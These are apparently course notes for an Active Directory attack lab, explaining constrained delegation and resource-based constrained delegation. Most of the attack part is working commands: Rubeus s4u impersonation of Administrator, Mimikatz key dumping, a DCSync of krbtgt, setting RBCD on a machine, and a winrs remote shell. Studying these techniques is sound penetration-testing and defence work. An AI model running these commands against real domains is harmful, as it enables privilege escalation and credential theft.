# Constrained Delegation

Constrained delegation allows a service to impersonate a user, but only to **specific services on specific computers** as defined in its configuration.

#### Example Scenario

1. A user (e.g., Joe) authenticates to a web application using a method that does not support Kerberos.
2. The web application, running under the `websvc` account, requests a TGS for Joe using **S4U2Self**.
3. The KDC verifies the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag on the `websvc` account and that Joe is not restricted from delegation.
4. If allowed, it returns a forwardable TGS for Joe.
5. The web service now uses **S4U2Proxy** to request access to a service like `CIFS/dcorp-mssql.dollarcorp.moneycorp.local`.
6. The KDC checks if this SPN is listed in `msDS-AllowedToDelegateTo` for `websvc`. If yes, it returns the TGS.
7. The web service uses the TGS to access the target service as Joe.

## Constrained Delegation with Protocol Transiction

If an attacker gains access to the `websvc` account, they can impersonate **any user** to access **any service** listed in `msDS-AllowedToDelegateTo`.

#### Enumeration

To find accounts with constrained delegation enabled:

*   **PowerView**:

    ```powershell
    Get-DomainUser -TrustedToAuth
    Get-DomainComputer -TrustedToAuth
    ```
*   **ActiveDirectory module**:

    ```powershell
    Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
    ```

#### Abuse via Rubeus

Request TGT and TGS in one step using `Rubeus`:

```powershell
Rubeus.exe s4u /user:websvc `
/aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 `
/impersonateuser:Administrator `
/msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
```

Then access:

```powershell
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

**Note:** The SPN in the TGS is in **clear-text**, making it possible to target sensitive services even when delegation was configured for seemingly low-risk systems.

Alternate scenario (with `/altservice` parameter):

```powershell
Rubeus.exe s4u /user:dcorp-adminsrv$ `
/aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 `
/impersonateuser:Administrator `
/msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL `
/altservice:ldap /ptt
```

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"
```

### Labs

* [Learning Object 16 lab](../../lab/16-lo1-6.md)

## Resource-Based Constrained Delegation (RBCD)

RBCD shifts delegation control from the _front-end service_ (e.g., web server) to the _target resource_ (e.g., database server).\
This is managed through the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, visible as `PrincipalsAllowedToDelegateToAccount`, which is stored on the resource.\
Unlike standard delegation types, **SeEnableDelegation** rights are not required. Any object with write permissions on the resource can configure RBCD.

To exploit RBCD effectively, you need:

1. **Write permissions** over the target resource.
2. **Control over an object with an SPN**, such as:
   * Local admin access to a domain-joined machine.
   * Ability to join a machine to the domain (default `ms-DS-MachineAccountQuota` = 10 for all users).

***

#### Enumeration and Exploitation

Identify write permissions with:

```powershell
Find-InterestingDomainACL | ? { $_.IdentityReferenceName -match 'ciadmin' }
```

Set RBCD using the ActiveDirectory module:

```powershell
$comps = 'dcorp-student1$','dcorp-student2$'
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```

Extract AES keys for the impersonating machine:

```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

Use the AES key with Rubeus to impersonate:

```powershell
Rubeus.exe s4u /user:dcorp-student1$ `
/aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 `
/msdsspn:http/dcorp-mgmt `
/impersonateuser:administrator /ptt
```

Then access the machine:

```powershell
winrs -r:dcorp-mgmt cmd.exe
```

### Labs

* [Learning Object 17 lab](../../lab/17-lo1-7.md)
